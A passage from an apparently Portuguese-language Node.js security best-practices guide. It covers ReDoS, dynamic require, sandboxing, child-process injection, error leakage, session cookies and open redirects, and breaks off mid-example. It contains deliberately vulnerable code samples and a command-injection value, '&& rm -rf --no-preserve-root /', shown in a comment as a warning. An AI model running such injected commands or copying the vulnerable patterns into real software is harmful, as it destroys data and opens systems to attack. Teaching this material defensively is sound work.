<p><a href="https://www.owasp.org/index.php/Denial_of_Service" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20DDOS%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Regular Expressions, embora sejam úteis, representam uma ameaça real para aplicativos JavaScript em geral, e a plataforma Node.js em particular .Uma entrada do usuário para correspondência de texto pode exigir uma quantidade maior de ciclos de CPU para processar. O processamento RegEx pode ser ineficiente até um ponto em que uma única solicitação que valida 10 palavras pode bloquear todo o loop de eventos por 6 segundos e botar 🔥 na CPU. Por essa razão, prefira pacotes de validação de terceiros como <a href="https://github.com/chriso/validator.js" target="_blank" rel="nofollow noopener noreferrer">validator.js</a> ao invés de escrever seus próprios pardrões de Regex, ou faça uso do <a href="https://github.com/substack/safe-regex" target="_blank" rel="nofollow noopener noreferrer">safe-regex</a> para detectar padrões vulneráveis de regex.</p>
<p><strong>Caso contrário:</strong> Expressões regulares mal escritas podem ser suscetíveis a ataques de Regular Expresssion DoS, que irão bloquear completamente o loop de eventos. Por exemplo, o popular pacote <code class="language-text">moment</code> foi encontrado com vulnerabilidades de uso de RegEx maliciosos em novembro de 2017.</p>
<h1>Evite que RegEx maliciosos sobrecarreguem sua execução de thread único</h1>
<h3>Explicação em um Parágrafo</h3>
<p>O risco inerente ao uso de Expressões Regulares são os recursos computacionais necessários para analisar o texto e corresponder a um determinado padrão. Para a plataforma Node.js, em que um loop de eventos de thread único é dominante, uma operação vinculada à CPU, como a resolução de um padrão de expressão regular, tornará o aplicativo sem resposta.
Evite RegEx quando possível ou delege a tarefa para uma biblioteca dedicada como <a href="https://github.com/chriso/validator.js" target="_blank" rel="nofollow noopener noreferrer">validator.js</a>, ou <a href="https://github.com/substack/safe-regex" target="_blank" rel="nofollow noopener noreferrer">safe-regex</a> para verificar se a RegEx é segura.</p>
<p>Alguns <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS" target="_blank" rel="nofollow noopener noreferrer">exemplos OWASP</a> de padrões vulneráveis de RegEx:</p>
<ul>
<li>(a|aa)+</li>
<li>([a-zA-Z]+)*</li>
</ul>
<h3>Exemplo de código - Ativando SSL/TLS usando o framework Express</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">var</span> saferegex <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'safe-regex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> emailRegex <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>

<span class="token comment">// deve ser falso porque o emailRegex é vulnerável a ataques de REDoS</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">saferegex</span><span class="token punctuation">(</span>emailRegex<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// em vez do padrão regex, use validator:</span>
<span class="token keyword">var</span> validator <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'validator'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>validator<span class="token punctuation">.</span><span class="token function">isEmail</span><span class="token punctuation">(</span><span class="token string">'liran.tal@gmail.com'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Citação de livro: “Uma expressão regular vulnerável é conhecida como aquela que se aplica à repetição”</h3>
<p>Do livro <a href="https://leanpub.com/nodejssecurity" target="_blank" rel="nofollow noopener noreferrer">Essential Node.js Security</a> por Liran Tal</p>
<blockquote>
<p>Freqüentemente, os programadores usarão RegExs para validar que uma entrada recebida de um usuário, para verificar se está de acordo com uma condição esperada. Uma Expressão Regular vulnerável é conhecida como uma que aplica a repetição a um grupo de captura de repetição e em que a string a ser correspondida é composta de um sufixo de um padrão de correspondência válido, mais caracteres que não correspondem ao grupo de captura.</p>
</blockquote>
<h2>6.17. Evite o carregamento de módulos usando uma variável</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A7:XSS%20-green.svg" alt></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A1:Injection%20-green.svg" alt></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A4:External%20Entities%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Evite fazer require ou importar outro arquivo com um caminho que tenha sido fornecido como parâmetro devido à preocupação de que ele possa ter se originado da entrada do usuário. Esta regra pode ser estendida para acessar arquivos em geral (ou seja, <code class="language-text">fs.readFile()</code>) ou outro acesso a recursos confidenciais com variáveis dinâmicas provenientes da entrada do usuário. O linter <a href="https://www.npmjs.com/package/eslint-plugin-security" target="_blank" rel="nofollow noopener noreferrer">Eslint-plugin-security</a> pode pegar esses padrões e avisar o quanto antes.</p>
<p><strong>Caso contrário:</strong> A entrada de usuário mal-intencionada pode encontrar o caminho para um parâmetro usado para require de arquivos adulterados, por exemplo, um arquivo carregado anteriormente no sistema de arquivos ou para acessar arquivos de sistema já existentes.</p>
<h1>Evite o carregamento de módulos usando uma variável</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Evite requerir/importar outro arquivo com um caminho que tenha sido fornecido como parâmetro devido à preocupação de que ele possa ter se originado da entrada do usuário. Esta regra pode ser estendida para acessar arquivos em geral (por exemplo, <code class="language-text">fs.readFile ()</code>) ou outros recursos sensíveis com variáveis ​​dinâmicas provenientes da entrada do usuário.</p>
<h3>Exemplo de código</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// inseguro, pois a variável helperPath pode ter sido modificada pela entrada do usuário</span>
<span class="token keyword">const</span> uploadHelpers <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span>helperPath<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// seguro</span>
<span class="token keyword">const</span> uploadHelpers <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./helpers/upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>6.18. Rode códigos não seguros em uma sandbox</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A7:XSS%20-green.svg" alt></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A1:Injection%20-green.svg" alt></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A4:External%20Entities%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Quando a tarefa for executar código externo que é fornecido em tempo de execução (por exemplo, plug-in), use qualquer tipo de ambiente de execução ‘sandbox’ que isole e proteja o código principal em relação ao plug-in. Isso pode ser feito usando um processo dedicado (por exemplo, cluster.fork ()), ambiente serverless ou pacotes npm dedicados que atuam como uma sandbox.</p>
<p><strong>Caso contrário:</strong> Um plugin pode atacar através de uma infinita variedade de opções, como loops infinitos, sobrecarga de memória e acesso a variáveis sensíveis do ambiente de processo.</p>
<h1>Rode códigos não seguros em uma sandbox</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Como regra geral, deve-se executar apenas seus próprios arquivos JavaScript. Teorias à parte, os cenários do mundo real exigem a execução de arquivos JavaScript que estão sendo transmitidos dinamicamente em tempo de execução. Por exemplo, considere uma estrutura dinâmica como o webpack que aceita carregadores personalizados e os execute dinamicamente durante o tempo de compilação. Na existência de algum plugin malicioso, nós queremos minimizar os danos e talvez até mesmo deixar o fluxo terminar com sucesso - isso requer a execução dos plugins em um ambiente sandbox que é totalmente isolado em termos de recursos, falhas e as informações que compartilhamos com ele. Três opções principais podem ajudar a alcançar esse isolamento:</p>
<ul>
<li>um processo filho dedicado - isso fornece um rápido isolamento de informações, mas exige domar o processo filho, limitar seu tempo de execução e recuperar-se dos erros</li>
<li>um framework cloud serverless preenche todos os requisitos do sandbox, mas a implementação e invocação de uma função FaaS dinamicamente não é um passeio no parque</li>
<li>algumas bibliotecas no npm, como <a href="https://www.npmjs.com/package/sandbox" target="_blank" rel="nofollow noopener noreferrer">sandbox</a> e <a href="https://www.npmjs.com/package/vm2" target="_blank" rel="nofollow noopener noreferrer">vm2</a> permitem a execução de código isolado em uma única linha de código. Embora esta última opção ganhe na simplicidade, ela fornece uma proteção limitada</li>
</ul>
<h3>Exemplo de código - Usando a biblioteca Sandbox para executar o código isoladamente</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> Sandbox <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"sandbox"</span><span class="token punctuation">)</span>
  <span class="token punctuation">,</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

s<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span> <span class="token string">"lol)hai"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">output</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">//output='Syntax error'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Exemplo 4 - Código restrito</span>
s<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span> <span class="token string">"process.platform"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">output</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">//output=Null</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// Example 5 - Loop infinito</span>
s<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span> <span class="token string">"while (true) {}"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">output</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">//output='Timeout'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>6.19. Tome cuidado extra ao trabalhar com processos filhos</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A7:XSS%20-green.svg" alt></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A1:Injection%20-green.svg" alt></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A4:External%20Entities%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Evite usar processos filhos quando possível e valide e limpe a entrada para mitigar os ataques de shell injection se ainda precisar. Prefira usar <code class="language-text">child_process.execFile</code> que, por definição, só executará um único comando com um conjunto de atributos e não permitirá a expansão de parâmetros do shell.</p>
<p><strong>Caso contrário:</strong> O uso ingênuo de processos filhos pode resultar na execução de comandos remotos ou em ataques de shell injection, devido à entrada do usuário mal-intencionado passada para um comando do sistema não-autorizado.</p>
<h1>Tome cuidado extra ao trabalhar com processos filhos</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Por melhores que sejam os processos filhos, eles devem ser usados ​​com cautela. A transmissão da entrada do usuário deve ser higienizada, se não completamente evitada.
Os perigos de entradas não analisadas executando em nível de lógica de sistema são ilimitados, alcançando desde a execução remota de código até a exposição de dados confidenciais do sistema e até mesmo perda de dados. Uma lista de verificação de preparações pode ser algo do tipo:</p>
<ul>
<li>evite a entrada do usuário em todos os casos, senão, valide e limpe-a</li>
<li>limitar os privilégios dos processos pai e filhos usando identidades de usuário/grupo</li>
<li>execute o seu processo dentro de um ambiente isolado para evitar efeitos colaterais indesejados se as outras preparações falharem</li>
</ul>
<h3>Exemplo de código: perigos de execuções de processos de filho não-analizados</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">{</span> exec <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">...</span>

<span class="token comment">// por exemplo, pegue um script que receba dois argumentos, um deles é uma entrada do usuário não-analizada</span>
<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'"/path/to/test file/someScript.sh" --someOption '</span> <span class="token operator">+</span> input<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// -> imagine o que poderia acontecer se o usuário simplesmente inserisse algo como '&amp;&amp; rm -rf --no-preserve-root /'</span>
<span class="token comment">// você teria uma surpresa indesejada</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Recursos Adicionais</h3>
<p>Da <a href="https://nodejs.org/dist/latest-v8.x/docs/api/child_process.html#child_process_child_process_exec_command_options_callback" target="_blank" rel="nofollow noopener noreferrer">documentation</a> do Node.js sobre processos filhos:</p>
<blockquote>
<p>Nunca passe a entrada de usuário não-analizada para esta função. Qualquer entrada contendo metacaracteres de shell pode ser usada para disparar a execução arbitrária de comandos.</p>
</blockquote>
<h2>6.20. Oculte detalhes de erros dos usuários</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A6:Security%20Misconfiguration%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Um manipulador de erros integrado do express oculta os detalhes de erros por padrão. Entretanto, são grandes as chances de você implementar sua própria lógica para manipular erros com objetos de erro customizados (considerado por muitos, a melhor prática). Se você faz isso, tenha certeza de que não está retornando o objeto Error inteiro para o cliente, pois ele pode conter detalhes confidenciais da aplicação.</p>
<p><strong>Caso contrário:</strong> Detalhes confidenciais da aplicação como caminhos e arquivos do servidor, módulos de terceiros em uso e outros workflows internos da aplicação poderiam ser explorados e expostos por um invasor.</p>
<h1>Oculte detalhes de erros dos usuários</h1>
<h3>Explicação em um Parágrafo</h3>
<p>A exposição dos detalhes de erros da aplicação ao cliente em produção deve ser evitada devido ao risco de expor detalhes confidenciais do aplicativo, como caminhos de arquivo do servidor, módulos de terceiros em uso e outros fluxos de trabalho internos da aplicação que poderiam ser explorados por um invasor.
O Express vem com um manipulador de erros embutido, que cuida de quaisquer erros que possam ser encontrados na aplicação. Essa função de middleware padrão de tratamento de erros é adicionada no final do stack de funções do middleware.
Se você passar um erro para <code class="language-text">next()</code> e você não o manipular em um manipulador de erro personalizado, ele será tratado pelo manipulador de erros Express; o erro será gravado no cliente com o rastreamento de stack. Esse comportamento será verdadeiro quando <code class="language-text">NODE_ENV</code> for definido como <code class="language-text">development</code>, no entanto, quando <code class="language-text">NODE_ENV</code> for definido como <code class="language-text">production</code>, o rastreio de pilha não será gravado, apenas o código de resposta HTTP.</p>
<h3>Exemplo de código: Manipulador de erros do express</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// manipulador de erros em produção</span>
<span class="token comment">// nenhum rastreamento de stack vazou para o usuário</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>status <span class="token operator">||</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        message<span class="token operator">:</span> err<span class="token punctuation">.</span>message<span class="token punctuation">,</span>
        error<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Recursos Adicionais</h3>
<p>🔗 <a href="https://expressjs.com/en/guide/error-handling.html" target="_blank" rel="nofollow noopener noreferrer">Documentação de manipulação de erros do Express.js</a></p>
<h2>6.21. Configure 2FA para o npm ou Yarn</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A6:Security%20Misconfiguration%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Qualquer passo na cadeia de desenvolvimento deve ser protegido com o MFA (multi-factor authentication, ou autenticação em várias etapas), e o npm / Yarn é uma boa oportunidade para os invasores poderem colocar as mãos na senha de algum desenvolvedor. Usando as credenciais de desenvolvedor, os invasores podem injetar código malicioso em bibliotecas que são amplamente instaladas em projetos e serviços. Talvez, até mesmo por toda a rede de internet, se publicado abertamente. Ativando a 2-factor-authentication (autenticação em duas etapas) no npm, reduz a quase zero as chances de invasores alterarem seu código.</p>
<p><strong>Caso contrário:</strong> <a href="https://medium.com/@oprearocks/eslint-backdoor-what-it-is-and-how-to-fix-the-issue-221f58f1a8c8" target="_blank" rel="nofollow noopener noreferrer">Você já ouviu falar sobre o desenvolvedor do eslint cuja senha foi hackeada?</a></p>
<h2>6.22. Modifique as configurações do middleware de sessão</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A6:Security%20Misconfiguration%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Cada framework e tecnologia web tem seus pontos fracos conhecidos - dizer aos invasores qual framework utilizamos é uma grande ajuda para eles. Usar as configurações padrões para middlewares de sessão pode expor sua aplicação - e ataques específicos ao framework, semelhantes ao heade <code class="language-text">X-Powered-By</code> header. Tente ocultar qualquer coisa que possa identificar ou revelar sua stack (por exemplo, Node.js, express).</p>
<p><strong>Caso contrário:</strong> Cookies podem ser enviados através de conexões não seguras, e um hacker pode usar a sessão do usuário para identificar o framework utilizado na aplicação, bem como vulnerabilidades específicas do módulo.</p>
<h1>Modifique as configurações do middleware de sessão</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Muitos middlewares de sessão populares não aplicam as melhores práticas/configurações de cookies seguros por padrão. Ajustar essas configurações a partir dos padrões oferece maior proteção tanto para o usuário quanto para a aplicação, reduzindo a ameaça de ataques como sequestro de sessão e identificação de sessão.</p>
<p>A configuração mais comum deixada como padrão é a sessão <code class="language-text">name</code> - em <code class="language-text">express-session</code> isto é <code class="language-text">connect.sid</code>. Um invasor pode usar essas informações para identificar a estrutura subjacente da aplicação da Web, bem como as vulnerabilidades específicas do módulo. Alterar esse valor para algo diferente do padrão tornará mais difícil determinar qual mecanismo de sessão está sendo usado.</p>
<p>Também em <code class="language-text">express-session</code>, a opção <code class="language-text">cookie.secure</code> é configurada para false como o valor padrão. Alterar isso para true restringirá o transporte do cookie para https, o que fornece segurança contra ataques do tipo man-in-the-middle</p>
<h3>Exemplo de código: definindo configurações de cookies seguros</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// usando o middleware de sessão do express</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  
 secret<span class="token operator">:</span> <span class="token string">'youruniquesecret'</span><span class="token punctuation">,</span> <span class="token comment">// seqüência secreta usada na assinatura do ID da sessão que é armazenado no cookie</span>
 name<span class="token operator">:</span> <span class="token string">'youruniquename'</span><span class="token punctuation">,</span> <span class="token comment">// definir um nome exclusivo para remover o padrão connect.sid</span>
 cookie<span class="token operator">:</span> <span class="token punctuation">{</span>
   httpOnly<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// minimizar o risco de ataques XSS, restringindo o cliente de ler o cookie</span>
   secure<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// envie apenas cookies por https</span>
   maxAge<span class="token operator">:</span> <span class="token number">60000</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">24</span> <span class="token comment">// definir a validade do cookie em ms</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>O que Outros Blogueiros Dizem</h3>
<p>Do blog <a href="http://nodesource.com/blog/nine-security-tips-to-keep-express-from-getting-pwned/" target="_blank" rel="nofollow noopener noreferrer">NodeSource</a>: </p>
<blockquote>
<p>…O Express tem configurações de cookies padrão que não são altamente seguras. Elas podem ser ajustadas manualmente para aumentar a segurança - tanto para um aplicativo quanto para seu usuário.*</p>
</blockquote>
<h2>6.23. Evite ataques do DOS definindo explicitamente quando um processo deve falhar</h2>
<p><a href="https://www.owasp.org/index.php/Denial_of_Service" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20DDOS%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> O processo do Node irá falhar quando os erros não forem tratados. Muitas boas práticas recomendam sair, mesmo que um erro tenha sido detectado e resolvido. O Express, por exemplo, irá falhar em qualquer erro assíncrono - a menos que você envolva rotas com uma cláusula catch. Isso abre um ponto de ataque muito fácil para os hackers que reconhecem qual entrada faz o processo falhar e enviam repetidamente o mesmo request. Não existe solução instantânea para isso, mas algumas técnicas podem aliviar a dor: Alertar com severidade crítica sempre que um processo falha devido a um erro não tratado, validar a entrada e evitar travar o processo devido à entrada inválida do usuário, envolver todas as rotas com uma cláusula catch e considerar não travar quando um erro é originado em uma solicitação o que acontece globalmente).</p>
<p><strong>Caso contrário:</strong> Este é apenas um palpite: dado muitos aplicações Node.js, se tentarmos passar um JSON vazio para todas as solicitações POST, um punhado de aplicações falhará. Nesse ponto, podemos apenas repetir o envio da mesma solicitação para derrubar as aplicações com facilidade.</p>
<h2>6.24. Impeça redirecionamentos não seguros</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A1:Injection%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Redirecionamentos que não validam a entrada do usuário podem permitir que invasores iniciem tentativas de phishing, roubem credenciais de usuários e executem outras ações mal-intencionadas.</p>
<p><strong>Caso contrário:</strong> Se um invasor descobrir que você não está validando informações externas fornecidas pelo usuário, ele poderá explorar essa vulnerabilidade postando links especialmente em fóruns, mídias sociais e outros locais públicos para que os usuários cliquem.</p>
<h1>Impeça redirecionamentos não seguros</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Quando os redirecionamentos são implementados no Node.js e/ou no Express, é importante executar a validação de entrada no lado do servidor.
Se um atacante descobrir que você não está validando informações externas fornecidas pelo usuário, ele poderá explorar essa vulnerabilidade postando links especialmente criados em fóruns, mídias sociais e outros locais públicos para que os usuários cliquem nele.</p>
<p>Exemplo: redirecionamento inseguro no express usando a entrada do usuário</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">isAuthenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>A correção sugerida para evitar redirecionamentos inseguros é evitar confiar na entrada do usuário. Se a entrada do usuário precisar ser usada, as listas de permissões de redirecionamento seguras podem ser usadas para evitar a exposição da vulnerabilidade.</p>
<p>Exemplo: Lista de permissões de redirecionamento seguro</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> whitelist <span class="token operator">=</span> <span class="token punctuation">{</span> 
  <span class="token string">'https://google.com'</span><span class="token operator">:</span> <span class="token number">1</span> 
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">getValidRedirect</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token comment">// verifique se o URL começa com uma única barra </span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^\/(?!\/)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token comment">// Prefira nosso domínio para ter certeza </span>
    <span class="token keyword">return</span> <span class="token string">'https://example.com'</span> <span class="token operator">+</span> url<span class="token punctuation">;</span> 
  <span class="token punctuation">}</span> 
    <span class="token comment">// Caso contrário, verifique com uma lista de permissões</span>
  <span class="token keyword">return</span> whitelist<span class="token punctuation">[</span>url<span class="token punctuation">]</span> <span class="token operator">?</span> url <span class="token operator">:</span> <span class="token string">'/'</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>

